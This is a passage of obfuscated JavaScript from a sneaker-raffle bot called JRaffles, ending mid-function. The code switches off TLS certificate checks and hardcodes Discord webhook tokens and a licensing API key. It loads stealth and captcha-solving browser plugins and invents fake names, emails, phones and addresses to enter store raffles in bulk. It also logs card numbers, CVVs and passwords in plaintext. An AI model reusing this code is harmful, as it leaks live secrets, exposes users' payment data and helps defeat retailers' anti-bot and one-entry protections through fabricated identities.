process['env']['NODE_TLS_REJECT_UNAUTHORIZED'] = '0';
const _0x4fe38c = require('fs'), _0x2cfa7f = new Date()['toDateString']() + '\x20' + new Date()['getHours']() + '\x20' + new Date()['getMinutes']() + '\x20' + new Date()['getSeconds']();
function _0x1c1354(_0xe8de7d) {
    const _0x4d5b6a = _0x4fe38c['createWriteStream'](_0xe8de7d, { 'flags': 'a' }), _0xde411e = console['log'];
    console['log'] = function () {
        const _0x4616d0 = Array['prototype']['slice']['call'](arguments), _0x554a5b = _0x4616d0['join']('\x20') + '\x0a';
        _0x4d5b6a['write'](_0x554a5b), _0xde411e['apply'](console, _0x4616d0);
    };
}
_0x1c1354('../logs/log\x20' + _0x2cfa7f);
var _0x3c3577 = require('tough-cookie'), _0x16dd9e = require('node-imap'), _0x468053 = require('util')['inspect'];
const _0x4b0324 = require('mailparser')['simpleParser'], { EmbedBuilder: _0x494f4a } = require('discord.js');
var _0x7709da = require('exe');
const { execFile: _0x3e0550 } = require('child_process'), _0x3d6bb6 = require('puppeteer-extra'), _0x4b9689 = require('puppeteer-extra-plugin-recaptcha'), _0x922449 = require('puppeteer-extra-plugin-stealth'), _0x5b4136 = require('chalk'), _0x299f70 = require('node-bash-title'), _0x3c1aeb = require('axios'), _0x1d9836 = require('papaparse');
var _0x129467 = require('random-name');
const _0x5e7c58 = require('request');
var _0x4adce7 = require('prompt');
const _0x1d89eb = _0x5e7c58['jar']();
var _0x8aa917 = {};
const _0x302564 = '1067398661929181186/wvxr1d4nwFDFE-hAKBisU_mVWLloqatitfWvCqqIv38EUYiJMm_Pr3VKsuLsUBKN3PPj', _0x3baa67 = '1067398862056210432/TZs7kSEcDtUD13Vzl7VQhculxdtocZI8HKU7l_fW_W0qthftmSpHxNDY9NB3Hc4v6Yhy', _0x3e6be6 = '1068515411877957743/t_TXlLhYbeQmPL19hyGeNqi1G0KPT8KCBYOVOcryGMvXPfIUBEpNZRBCC1j7OFRej4A6', _0x47c533 = '1068519704525807616/luGgvM1ZbR7g1zM5-10y5yceL2OGVCjrlkB6XxQL-hdoHUJ6hwSVAn6vVNyieHWLqPHE', _0x58ecd4 = '1070657276525940746/GSfXwIxjuRjwmP3sTDw73M4V2P5OJqMFgZyECtpBwFmtXGINvj1xFsVsZ2KwGBpJNHpn', _0x296fa2 = '1072865476457287711/EePVQu0bb06IdHG3FfG7M-JDaE-38prupCPoCqaduP6mG_tsshUSaKidyfyVx0YgNC7e';
var _0x36d0f9 = 'https://discord.com/api/webhooks/', _0x393d40 = '' + _0x36d0f9 + _0x3e6be6, _0x410b1d = '' + _0x36d0f9 + _0x47c533, _0x275f2a = '' + _0x36d0f9 + _0x302564, _0x3ba800 = '' + _0x36d0f9 + _0x3baa67, _0x583375 = '' + _0x36d0f9 + _0x58ecd4, _0x1b75ce = '' + _0x36d0f9 + _0x296fa2;
const _0xb22668 = JSON['parse'](_0x4fe38c['readFileSync']('../package.json', 'utf-8')), _0xe2f4c8 = _0xb22668['version'];
var _0x1901f8, _0x504c2d, _0x157e7b, _0x2613a7, _0x3bee28, _0x462202, _0x4b3861, _0x549a36;
const _0x40cbb1 = 'pk_7R7rRwMpveiR8OufEx9xIDMdU8Y95GgvGLF59wWRqklMwhXdpDnh5sN2KfaPHjEe';
let _0x57a1bf = ![];
const _0x1eb156 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ', _0x2619bf = '0123456789';
var _0x26a16b = _0x1eb156['split']('');
const _0x5d793a = require('auto-git-update'), _0x1388c0 = {
    'repository': 'https://github.com/Jarno97/JRafflesBot',
    'branch': 'main',
    'fromReleases': ![],
    'tempLocation': 'C:/temp/jraffles',
    'ignoreFiles': [
        'settings.json',
        'proxies.txt',
        'tasks/maha.csv',
        'tasks/footshop.csv',
        'tasks/afew.csv',
        'tasks/oqium.csv',
        'tasks/patta.csv',
        'accounts/patta.csv',
        'tasks/kickz.csv',
        'accounts/kickz-verified.csv',
        'accounts/kickz-unverified.csv'
    ]
}, _0x1e6952 = new _0x5d793a(_0x1388c0);
async function _0xbe10e3() {
    _0x3bee28 = _0x4fe38c['readdirSync']('../proxies'), _0x2613a7 = _0x4fe38c['readdirSync']('../tasks'), !_0x4fe38c['existsSync']('../accounts/fenom.csv') && _0x4fe38c['writeFileSync']('../accounts/fenom.csv', 'Email,Password\x0a'), !_0x4fe38c['existsSync']('../accounts/paypal.csv') && _0x4fe38c['writeFileSync']('../accounts/paypal.csv', 'Email,Password,Proxy\x0a'), !_0x4fe38c['existsSync']('../accounts/bstn.csv') && _0x4fe38c['writeFileSync']('../accounts/bstn.csv', 'Email,Password\x0a'), !_0x4fe38c['existsSync']('../accounts/eql.csv') && _0x4fe38c['writeFileSync']('../accounts/eql.csv', 'Email,Password,Phone\x0a'), !_0x4fe38c['existsSync']('../failed-tasks.csv') && _0x4fe38c['writeFileSync']('../failed-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), !_0x4fe38c['existsSync']('../successful-tasks.csv') && _0x4fe38c['writeFileSync']('../successful-tasks.csv', 'Time,Store,Mode,Url,Size,Follower,FirstName,LastName,Address1,Address2,HouseNumber,Zip,City,State,Country,Phone,Email,Password,PaymentMethod,CardType,NameOnCard,CardNumber,ExpiryDate,CVV,IsBillingSame,BillingFirstName,BillingLastName,BillingAddress1,BillingAddress2,BillingHouseNumber,BillingZip,BillingCity,BillingState,BillingCountry,BillingPhone\x0a'), _0x8aa917 = JSON['parse'](_0x4fe38c['readFileSync']('../settings.json', 'utf-8')), !_0x8aa917['delay'] && (_0x8aa917['delay'] = 0x3c, _0x4fe38c['writeFileSync']('../settings.json', JSON['stringify'](_0x8aa917, null, 0x2))), !_0x8aa917['masterMail'] && (_0x8aa917['masterMail'] = 'yourmail@gmail.com', _0x4fe38c['writeFileSync']('../settings.json', JSON['stringify'](_0x8aa917, null, 0x2))), !_0x8aa917['masterPassword'] && (_0x8aa917['masterPassword'] = 'read\x20the\x20guide\x20on\x20how\x20to\x20get\x20an\x20APP\x20PASSWORD', _0x4fe38c['writeFileSync']('../settings.json', JSON['stringify'](_0x8aa917, null, 0x2))), !_0x8aa917['captchaKey'] && (_0x8aa917['captchaKey'] = '', _0x4fe38c['writeFileSync']('../settings.json', JSON['stringify'](_0x8aa917, null, 0x2))), !_0x8aa917['useRandomProxy'] && (_0x8aa917['useRandomProxy'] = !![], _0x4fe38c['writeFileSync']('../settings.json', JSON['stringify'](_0x8aa917, null, 0x2))), !_0x8aa917['shuffleTasks'] && (_0x8aa917['shuffleTasks'] = ![], _0x4fe38c['writeFileSync']('../settings.json', JSON['stringify'](_0x8aa917, null, 0x2))), !_0x8aa917['webhook'] && (_0x8aa917['webhook'] = '', _0x4fe38c['writeFileSync']('../settings.json', JSON['stringify'](_0x8aa917, null, 0x2))), _0x8aa917['delay'] <= 0x1388 && (_0x8aa917['delay'] = _0x8aa917['delay'] * 0x3e8), _0x8aa917['AfewDelay'] && (delete _0x8aa917['AfewDelay'], _0x4fe38c['writeFileSync']('../settings.json', JSON['stringify'](_0x8aa917, null, 0x2))), _0x8aa917['MahaDelay'] && (delete _0x8aa917['MahaDelay'], _0x4fe38c['writeFileSync']('../settings.json', JSON['stringify'](_0x8aa917, null, 0x2))), _0x8aa917['footshopDelay'] && (delete _0x8aa917['footshopDelay'], _0x4fe38c['writeFileSync']('../settings.json', JSON['stringify'](_0x8aa917, null, 0x2))), _0x8aa917['MahaDelay'] = _0x8aa917['delay'], _0x36d0f9 = _0x8aa917['webhook'], _0x462202 = _0x8aa917['licenseKey'];
}
let _0x3f1fb7, _0x59afab = [], _0x41d0d0;
const _0x32344d = _0x22ee8c => new Promise(_0x334ef4 => setTimeout(_0x334ef4, _0x22ee8c));
function _0x4f2c19(_0x20a2a9, _0x405db1) {
    return Math['floor'](Math['random']() * (_0x405db1 - _0x20a2a9 + 0x1) + _0x20a2a9);
}
function _0x3269e5(_0x1e5822) {
    let _0x58d05a = _0x1e5822['length'], _0x40e7e3;
    while (_0x58d05a != 0x0) {
        _0x40e7e3 = Math['floor'](Math['random']() * _0x58d05a), _0x58d05a--, [_0x1e5822[_0x58d05a], _0x1e5822[_0x40e7e3]] = [
            _0x1e5822[_0x40e7e3],
            _0x1e5822[_0x58d05a]
        ];
    }
    return _0x1e5822;
}
async function _0x1fcc50(_0x406706) {
    return _0x3c1aeb['get']('https://api.hyper.co/v4/licenses/' + _0x406706, { 'headers': { 'Authorization': 'Bearer\x20' + _0x40cbb1 } })['then'](_0x6decf5 => _0x6decf5['data'])['catch'](() => null);
}
;
async function _0x285138(_0x3d1b4c) {
    console['clear']();
    if (_0x3d1b4c == 'AWGH-0N92-JE6S-HOHU') {
        console['log']('Please\x20paste\x20your\x20key\x20here:');
        var _0x5cf34d = await _0x4adce7['get']('License');
        if (_0x5cf34d['License'] == 'AWGH-0N92-JE6S-HOHU')
            return console['log']('Error\x20please\x20use\x20the\x20key\x20on\x20the\x20JRaffles\x20dashboard'), await _0x32344d(0xbb8), _0x285138(_0x3d1b4c);
        _0x3d1b4c = _0x5cf34d['License'], _0x8aa917['licenseKey'] = _0x3d1b4c, _0x462202 = _0x3d1b4c, _0x4fe38c['writeFileSync']('../settings.json', JSON['stringify'](_0x8aa917));
    }
    console['log']('Checking\x20license\x20' + _0x462202 + '...'), await _0x32344d(0x320);
    const _0x49171b = await _0x1fcc50(_0x3d1b4c);
    _0x4b3861 = JSON['stringify'](_0x49171b['user']['discord']['username'])['substring'](0x1)['slice'](0x0, -0x1), _0x549a36 = JSON['stringify'](_0x49171b['user']['discord']['avatar'])['substring'](0x1)['slice'](0x0, -0x1);
    if (!_0x49171b)
        return console['log']('License\x20not\x20found');
    if (!_0x49171b['user'])
        return console['log']('License\x20not\x20bound');
    return _0x49171b['status'] === 'active' ? (console['log']('License\x20is\x20good\x20to\x20go!'), _0x57a1bf = !![]) : (console['log']('Could\x20not\x20find\x20license..'), _0x57a1bf = ![]);
}
async function _0x2d9eb7() {
    var _0x547247 = await _0x4adce7['get']('Module');
    return console['clear'](), _0x547247['Module'];
}
;
async function _0x49e90f() {
    var _0x2a263c = await _0x4adce7['get']('Setting');
    return console['clear'](), _0x2a263c['Setting'];
}
async function _0x3ac6d3(_0x5a67aa) {
    var _0xb12377 = [];
    for (file of _0x2613a7) {
        var _0x3a896b = _0x4fe38c['readFileSync']('../tasks/' + file, 'utf-8');
        tsParse = _0x1d9836['parse'](_0x3a896b, { 'header': !![] })['data'], tsParse[0x0]['Store'] == _0x5a67aa['store'] && _0xb12377['push'](file);
    }
    !_0xb12377['length'] == 0x0 && (_0x2613a7 = _0xb12377);
    console['log']('Choose\x20A\x20File\x20to\x20Run\x20\x0a');
    for (var _0x5eeea2 = 0x0; _0x5eeea2 < _0x2613a7['length']; _0x5eeea2++) {
        console['log']('\x20(' + _0x5eeea2 + ')\x20' + _0x2613a7[_0x5eeea2]);
    }
    console['log']('');
    var _0x11ce11 = await _0x4adce7['get']('Task');
    if (_0x11ce11['Task'] > _0x2613a7['length'] - 0x1 || isNaN(_0x11ce11['Task']) == !![])
        return console['log']('Invalid\x20selection'), await _0x32344d(0x3e8), _0x3ac6d3();
    var _0x43a3b0 = _0x4fe38c['readFileSync']('../tasks/' + _0x2613a7[_0x11ce11['Task']], 'utf-8');
    return _0x157e7b = _0x1d9836['parse'](_0x43a3b0, { 'header': !![] })['data'], console['clear'](), console['log']('Running\x20' + _0x5b4136['blue'](_0x2613a7[_0x11ce11['Task']])), _0x1901f8 = _0x2613a7[_0x11ce11['Task']], _0x157e7b;
}
async function _0x278dd0() {
    console['clear'](), console['log']('Choose\x20Proxies\x20to\x20Use\x20\x0a');
    for (var _0x4c1fe5 = 0x0; _0x4c1fe5 < _0x3bee28['length']; _0x4c1fe5++) {
        console['log']('\x20(' + _0x4c1fe5 + ')\x20' + _0x3bee28[_0x4c1fe5]);
    }
    console['log']('');
    var _0x527361 = await _0x4adce7['get']('Proxies');
    if (_0x527361['Proxies'] > _0x3bee28['length'] - 0x1 || isNaN(_0x527361['Proxies']) == !![])
        return console['log']('Invalid\x20selection'), await _0x32344d(0x3e8), _0x278dd0();
    var _0x3498f8 = _0x4fe38c['readFileSync']('../proxies/' + _0x3bee28[_0x527361['Proxies']], 'utf-8')['split']('\x0a');
    let _0x5070ec = _0x3498f8['map']((_0x369920, _0x38b10e) => {
        sanatizeProxy = _0x369920['replace']('\x0d', '');
        if (_0x3498f8[_0x38b10e + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x504c2d = _0x3bee28[_0x527361['Proxies']], console['clear'](), _0x5070ec;
}
async function _0x2190d8() {
    var _0x7ac2f4 = await _0x4adce7['get']('Value');
    return console['clear'](), _0x7ac2f4['Value'];
}
async function _0x2f4b88(_0x287f10) {
    console['clear'](), console['log']('What\x20would\x20you\x20like\x20to\x20do?\x20\x0a');
    for (var _0xe77ae8 = 0x0; _0xe77ae8 < _0x287f10['length']; _0xe77ae8++) {
        console['log']('\x20(' + _0xe77ae8 + ')\x20[' + _0x287f10[_0xe77ae8]['name'] + ']');
    }
    ;
    console['log']('');
    var _0x23b653 = await _0x4adce7['get']('Module');
    return _0x23b653['Module'];
}
async function _0x29b653() {
    var _0x172c82 = await _0x4adce7['get']('Password');
    return console['clear'](), _0x172c82['Password'];
}
;
async function _0x3f6cc3() {
    var _0xaafb64 = await _0x4adce7['get']('Links');
    return _0xaafb64['Links'];
}
;
async function _0x2ef326() {
    console['log']('Choose\x20a\x20Raffle\x20to\x20enter:\x20\x0a');
    for (var _0x3d2def = 0x0; _0x3d2def < _0x59afab['length']; _0x3d2def++) {
        console['log']('\x20(' + _0x3d2def + ')\x20' + _0x59afab[_0x3d2def]);
    }
    ;
    console['log']();
    let _0x54c08b = await _0x4adce7['get']('Product');
    return console['clear'](), _0x54c08b['Product'];
}
;
function _0xb0c82c() {
    var _0x5d2e3d = new Date(Date['now']())['toLocaleTimeString']();
    return _0x5d2e3d;
}
;
function _0x2300a1() {
    var _0x4f3934 = new Date(Date['now']())['toLocaleString']();
    return _0x4f3934['replace'](',', '');
}
async function _0x16e110(_0x3c37a4, _0x13bd43) {
    let _0x5b160a = { 'headers': { 'content-type': 'application/json' } };
    if (_0xe2f4c8 != 'devkey') {
        await _0x3c1aeb['post'](_0x3c37a4, _0x13bd43, _0x5b160a);
        return;
    }
    return console['log']('devkey\x20settings\x20enabled,\x20not\x20sending\x20webhooks');
}
;
async function _0xe56989(_0x202ab7, _0x2c3c6e, _0x20ab61, _0x3414d8, _0xfe7312) {
    if (!_0x3414d8 && _0x20ab61 == 'dev') {
        var _0x3fc008 = new _0x494f4a()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Raffle\x20Entry')['setAuthor']({
            'name': 'JRaffles',
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
            'url': 'https://twitter.com/JRaffles_'
        })['setThumbnail'](_0x2c3c6e['logo'])['addFields']({
            'name': 'Store',
            'value': '' + _0x2c3c6e['store'],
            'inline': !![]
        })['addFields']({
            'name': 'Size',
            'value': '' + _0x202ab7['Size'],
            'inline': !![]
        })['addFields']({
            'name': 'Delay',
            'value': '' + _0x8aa917['delay'],
            'inline': !![]
        })['addFields']({
            'name': 'User',
            'value': '' + _0x4b3861,
            'inline': !![]
        })['addFields']({
            'name': 'URL',
            'value': '' + _0x202ab7['Url'],
            'inline': !![]
        })['addFields']({
            'name': 'Mail',
            'value': '' + _0x202ab7['Email'],
            'inline': !![]
        })['setTimestamp']()['setFooter']({
            'text': 'JRaffles\x20v' + _0xe2f4c8,
            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
        });
        return _0x3fc008['data'];
    } else {
        if (_0x3414d8 && _0x20ab61 == 'dev') {
            var _0x3fc008 = new _0x494f4a()['setColor'](0xc0d6d6)['setTitle']('Failed\x20Raffle\x20Entry')['setAuthor']({
                'name': 'JRaffles',
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                'url': 'https://twitter.com/JRaffles_'
            })['setThumbnail'](_0x2c3c6e['logo'])['addFields']({
                'name': 'User',
                'value': '' + _0x4b3861,
                'inline': !![]
            }, {
                'name': 'Store',
                'value': '' + _0x2c3c6e['store'],
                'inline': !![]
            }, {
                'name': 'Size',
                'value': '' + _0x202ab7['Size'],
                'inline': !![]
            }, {
                'name': 'Delay',
                'value': '' + _0x8aa917['delay'],
                'inline': !![]
            })['addFields']({
                'name': 'ERROR',
                'value': '' + _0xfe7312,
                'inline': !![]
            })['addFields']({
                'name': 'URL',
                'value': '' + _0x202ab7['Url']
            })['addFields']({
                'name': 'Mail',
                'value': '' + _0x202ab7['Email'],
                'inline': !![]
            })['setTimestamp']()['setFooter']({
                'text': 'JRaffles\x20v' + _0xe2f4c8,
                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
            });
            return _0x3fc008['data'];
        } else {
            if (_0x20ab61 == 'pub') {
                var _0x3fc008 = new _0x494f4a()['setColor'](0xc0d6d6)['setTitle']('Succesful\x20Raffle\x20Entry')['setAuthor']({
                    'name': 'JRaffles',
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                    'url': 'https://twitter.com/JRaffles_'
                })['setThumbnail'](_0x2c3c6e['logo'])['addFields']({
                    'name': 'Store',
                    'value': '' + _0x2c3c6e['store'],
                    'inline': !![]
                }, {
                    'name': 'Size',
                    'value': '' + _0x202ab7['Size'],
                    'inline': !![]
                }, {
                    'name': 'Delay',
                    'value': '' + _0x8aa917['delay'],
                    'inline': !![]
                })['addFields']({
                    'name': 'URL',
                    'value': '||' + _0x202ab7['Url'] + '||'
                })['setTimestamp']()['setFooter']({
                    'text': 'JRaffles\x20v' + _0xe2f4c8,
                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                });
                return _0x3fc008['data'];
            } else {
                if (_0x20ab61 == 'acc' && !_0x3414d8) {
                    var _0x3fc008 = new _0x494f4a()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generated')['setAuthor']({
                        'name': 'JRaffles',
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                        'url': 'https://twitter.com/JRaffles_'
                    })['setThumbnail'](_0x2c3c6e['logo'])['addFields']({
                        'name': 'User',
                        'value': '' + _0x4b3861,
                        'inline': !![]
                    }, {
                        'name': 'Store',
                        'value': '' + _0x2c3c6e['store'],
                        'inline': !![]
                    }, {
                        'name': 'Delay',
                        'value': '' + _0x8aa917['delay'],
                        'inline': !![]
                    })['setTimestamp']()['setFooter']({
                        'text': 'JRaffles\x20v' + _0xe2f4c8,
                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                    });
                    return _0x3fc008['data'];
                } else {
                    if (_0x20ab61 == 'acc' && _0x3414d8) {
                        var _0x3fc008 = new _0x494f4a()['setColor'](0xc0d6d6)['setTitle']('Account\x20Generation\x20Failed')['setAuthor']({
                            'name': 'JRaffles',
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                            'url': 'https://twitter.com/JRaffles_'
                        })['setThumbnail'](_0x2c3c6e['logo'])['addFields']({
                            'name': 'User',
                            'value': '' + _0x4b3861,
                            'inline': !![]
                        }, {
                            'name': 'Error',
                            'value': '' + _0xfe7312,
                            'inline': !![]
                        }, {
                            'name': 'Store',
                            'value': '' + _0x2c3c6e['store'],
                            'inline': !![]
                        }, {
                            'name': 'Delay',
                            'value': '' + _0x8aa917['delay'],
                            'inline': !![]
                        })['setTimestamp']()['setFooter']({
                            'text': 'JRaffles\x20v' + _0xe2f4c8,
                            'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                        });
                        return _0x3fc008['data'];
                    } else {
                        if (_0x20ab61 == 'open') {
                            var _0x3fc008 = new _0x494f4a()['setColor'](0xc0d6d6)['setTitle']('User\x20Opened\x20JRaffles')['setAuthor']({
                                'name': 'JRaffles',
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                'url': 'https://twitter.com/JRaffles_'
                            })['setThumbnail'](_0x549a36)['addFields']({
                                'name': 'User',
                                'value': '' + _0x4b3861,
                                'inline': !![]
                            })['setTimestamp']()['setFooter']({
                                'text': 'JRaffles\x20v' + _0xe2f4c8,
                                'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                            });
                            return _0x3fc008['data'];
                        } else {
                            if (!_0x3414d8 && _0x20ab61 == 'ver') {
                                var _0x3fc008 = new _0x494f4a()['setColor'](0xc0d6d6)['setTitle']('Successful\x20Verification')['setAuthor']({
                                    'name': 'JRaffles',
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                    'url': 'https://twitter.com/JRaffles_'
                                })['setThumbnail'](_0x2c3c6e['logo'])['addFields']({
                                    'name': 'User',
                                    'value': '' + _0x4b3861,
                                    'inline': !![]
                                }, {
                                    'name': 'Store',
                                    'value': '' + _0x2c3c6e['store'],
                                    'inline': !![]
                                }, {
                                    'name': 'Delay',
                                    'value': '' + _0x8aa917['delay'],
                                    'inline': !![]
                                })['setTimestamp']()['setFooter']({
                                    'text': 'JRaffles\x20v' + _0xe2f4c8,
                                    'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                });
                                return _0x3fc008['data'];
                            } else {
                                if (_0x3414d8 && _0x20ab61 == 'ver') {
                                    var _0x3fc008 = new _0x494f4a()['setColor'](0xc0d6d6)['setTitle']('Verification\x20Failed')['setAuthor']({
                                        'name': 'JRaffles',
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg',
                                        'url': 'https://twitter.com/JRaffles_'
                                    })['setThumbnail'](_0x2c3c6e['logo'])['addFields']({
                                        'name': 'User',
                                        'value': '' + _0x4b3861,
                                        'inline': !![]
                                    }, {
                                        'name': 'Error',
                                        'value': '' + _0xfe7312,
                                        'inline': !![]
                                    }, {
                                        'name': 'Store',
                                        'value': '' + _0x2c3c6e['store'],
                                        'inline': !![]
                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x8aa917['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0xe2f4c8,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x3fc008['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x4669df(_0x5227f1, _0x3d7a42) {
    var _0x3ad5ed = _0x5227f1[_0x3d7a42]['Address1']['split'](''), _0x3244bc = _0x5227f1[_0x3d7a42]['Address2']['split'](''), _0x18361f = _0x5227f1[_0x3d7a42]['Email']['split']('@');
    for (var _0x5b9330 = 0x0; _0x5b9330 < _0x3ad5ed['length']; _0x5b9330++) {
        if (_0x3ad5ed[_0x5b9330] == 'X') {
            var _0x5003c7 = Math['round'](Math['random']() * (_0x1eb156['length'] - 0x1));
            _0x3ad5ed[_0x5b9330] = _0x26a16b[_0x5003c7];
        }
    }
    ;
    for (var _0x5b9330 = 0x0; _0x5b9330 < _0x3244bc['length']; _0x5b9330++) {
        if (_0x3244bc[_0x5b9330] == 'X') {
            var _0x5003c7 = Math['round'](Math['random']() * (_0x1eb156['length'] - 0x1));
            _0x3244bc[_0x5b9330] = _0x26a16b[_0x5003c7];
        }
    }
    ;
    _0x5227f1[_0x3d7a42]['FirstName']['toUpperCase']() == 'RANDOM' && (_0x5227f1[_0x3d7a42]['FirstName'] = _0x129467['first']());
    _0x5227f1[_0x3d7a42]['LastName']['toUpperCase']() == 'RANDOM' && (_0x5227f1[_0x3d7a42]['LastName'] = _0x129467['last']());
    _0x18361f[0x0]['toUpperCase']() == 'RANDOM' ? _0x18361f[0x0] = '' + _0x129467['first']() + _0x129467['last']() + _0x4f2c19(0x1, 0x270f) + '@' : _0x18361f[0x0] = _0x18361f[0x0] + '@';
    _0x5227f1[_0x3d7a42]['Email'] = _0x18361f['join'](''), _0x5227f1[_0x3d7a42]['Address1'] = _0x3ad5ed['join'](''), _0x5227f1[_0x3d7a42]['Address2'] = _0x3244bc['join']('');
    _0x5227f1[_0x3d7a42]['Phone'] == 'RANDOM' && (_0x5227f1[_0x3d7a42]['Phone'] = '0' + _0x4f2c19(0x5f5e100, 0x3b9ac9ff));
    if (_0x5227f1[_0x3d7a42]['Follower']['toUpperCase']() == 'RANDOM') {
        var _0x52325b = _0x4f2c19(0x1, 0x270f);
        _0x5227f1[_0x3d7a42]['Follower'] = '' + _0x129467['first']() + _0x129467['last']() + _0x52325b + '\x20';
    }
    _0x5227f1[_0x3d7a42]['HouseNumber']['toUpperCase']() == 'RANDOM' && (_0x5227f1[_0x3d7a42]['HouseNumber'] = _0x4f2c19(0x1, 0xc8));
    if (_0x5227f1[_0x3d7a42]['Address1']['toUpperCase']() == 'RANDOM') {
        var _0x430cc2 = Math['round'](Math['random']() * (_0x1eb156['length'] - 0x1)), _0x42a931 = _0x26a16b[_0x430cc2];
        _0x5227f1[_0x3d7a42]['Address1'] = _0x129467['last']() + 'straat', _0x5227f1[_0x3d7a42]['Zip'] == '' && (_0x5227f1[_0x3d7a42]['Postcode'] = _0x4f2c19(0x3e8, 0x270f) + '\x20' + _0x42a931 + _0x42a931, _0x5227f1[_0x3d7a42]['Zip'] = _0x5227f1[_0x3d7a42]['Postcode']), _0x5227f1[_0x3d7a42]['HouseNumber'] = '' + _0x4f2c19(0x1, 0xc8);
    }
    return;
}
;
async function _0x4af7c0(_0x477603, _0x218f38) {
    _0x4fe38c['appendFileSync']('../failed-tasks.csv', _0x2300a1() + ',' + _0x218f38['store'] + ',' + _0x218f38['name'] + ',' + _0x477603['Url'] + ',' + _0x477603['Size'] + ',' + _0x477603['Follower'] + ',' + _0x477603['FirstName'] + ',' + _0x477603['LastName'] + ',' + _0x477603['Address1'] + ',' + _0x477603['Address2'] + ',' + _0x477603['HouseNumber'] + ',' + _0x477603['Zip'] + ',' + _0x477603['City'] + ',' + _0x477603['State'] + ',' + _0x477603['Country'] + ',' + _0x477603['Phone'] + ',' + _0x477603['Email'] + ',' + _0x477603['Password'] + ',' + _0x477603['PaymentMethod'] + ',' + _0x477603['CardType'] + ',' + _0x477603['NameOnCard'] + ',' + _0x477603['CardNumber'] + ',' + _0x477603['ExpiryDate'] + ',' + _0x477603['CVV'] + ',' + _0x477603['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
async function _0x5677a4(_0x43331b, _0x1d8ebf) {
    _0x4fe38c['appendFileSync']('../successful-tasks.csv', _0x2300a1() + ',' + _0x1d8ebf['store'] + ',' + _0x1d8ebf['name'] + ',' + _0x43331b['Url'] + ',' + _0x43331b['Size'] + ',' + _0x43331b['Follower'] + ',' + _0x43331b['FirstName'] + ',' + _0x43331b['LastName'] + ',' + _0x43331b['Address1'] + ',' + _0x43331b['Address2'] + ',' + _0x43331b['HouseNumber'] + ',' + _0x43331b['Zip'] + ',' + _0x43331b['City'] + ',' + _0x43331b['State'] + ',' + _0x43331b['Country'] + ',' + _0x43331b['Phone'] + ',' + _0x43331b['Email'] + ',' + _0x43331b['Password'] + ',' + _0x43331b['PaymentMethod'] + ',' + _0x43331b['CardType'] + ',' + _0x43331b['NameOnCard'] + ',' + _0x43331b['CardNumber'] + ',' + _0x43331b['ExpiryDate'] + ',' + _0x43331b['CVV'] + ',' + _0x43331b['IsBillingSame'] + ',,,,,,,,,,\x0a');
}
function _0x160ce3() {
    let _0x1b9c20 = proxyFile['split']('\x0a'), _0x40dd8 = _0x1b9c20['map']((_0x436516, _0x243758) => {
        sanatizeProxy = _0x436516['replace']('\x0d', '');
        if (_0x1b9c20[_0x243758 + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x40dd8;
}
;
async function _0x36c025(_0x1e15ca, _0x1aed83) {
    if (_0x1221d1 != 'yes')
        var _0x1221d1 = '', _0x3c65ad = 0x0;
    async function _0x46f7f3() {
        var _0x537ae8 = _0x4fe38c['readFileSync']('../accounts/paypal.csv', 'utf-8');
        let _0x20a06d = _0x1d9836['parse'](_0x537ae8, { 'header': !![] })['data'];
        console['log']('Choose\x20a\x20Paypal\x20to\x20use:\x0a');
        for (var _0x4f8132 = 0x0; _0x4f8132 < _0x20a06d['length']; _0x4f8132++) {
            console['log']('(' + _0x4f8132 + ')\x20' + _0x20a06d[_0x4f8132]['Email']);
        }
        console['log']('\x0a(' + _0x20a06d['length'] + ')\x20' + _0x5b4136['cyan']('Add\x20a\x20new\x20account'));
        let _0x378951 = await _0x4adce7['get']('Option');
        if (_0x378951['Option'] < _0x20a06d['length'])
            return _0x20a06d[_0x378951['Option']];
        console['clear'](), console['log']('Adding\x20a\x20new\x20account\x0aEnter\x20your\x20paypal\x27s\x20email:\x0a');
        let _0x2eaa73 = {}, _0x4f09d0 = await _0x4adce7['get']('Email');
        _0x2eaa73['Email'] = _0x4f09d0['Email'];
